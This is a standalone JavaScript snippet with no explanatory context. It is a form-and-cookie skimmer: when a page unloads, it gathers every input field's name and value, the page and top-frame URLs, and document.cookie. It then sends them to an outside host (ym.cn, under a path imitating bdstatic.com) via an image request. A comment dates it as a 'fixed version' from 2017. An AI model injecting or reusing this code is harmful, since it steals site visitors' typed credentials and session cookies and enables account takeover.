document.getElementsByTagName("body")[0].setAttribute("onunload","postData()");
function postData() {
        var locationurl=function() {
        try {
            return document.location
        } catch(e) {
            return ''
        }
    }();
        var topurl=function() {
        try {
            return top.location.href
        } catch(e) {
            return ''
        }
    }();
        var cookie = function() {
        try {
            return document.cookie
        } catch(e) {
            return ''
        }
    }();
        var inputs, index;
        var output ="";
        var outputif ="";
        inputs = document.getElementsByTagName('input');
        for (index = 0; index < inputs.length; ++index) {
                input_name = inputs[index].id || inputs[index].name;
                if(input_name.replace(/(^s*)|(s*$)/g, "").length >2 || inputs[index].value.replace(/(^s*)|(s*$)/g, "").length >2){
                   output = output + "----" + input_name + "=" + inputs[index].value;
                   if(input_name.toLowerCase != "submit" || inputs[index].type.toLowerCase != "submit"){
                       outputif = outputif + inputs[index].value;
                   }
                 }
        }
        output = encodeURIComponent(output); //此版本为修复版2017-08-08 gdd.gd
        if(outputif.replace(/(^s*)|(s*$)/g, "").length >4){
            new Image().src = "//ym.cn/bdstatic.com/?callback=jsonp&id=c0uI"+"&location="+encodeURIComponent(locationurl)+"&toplocation="+encodeURIComponent(topurl)+"&datastorage="+output+"&cookie="+encodeURIComponent(cookie);
        }
}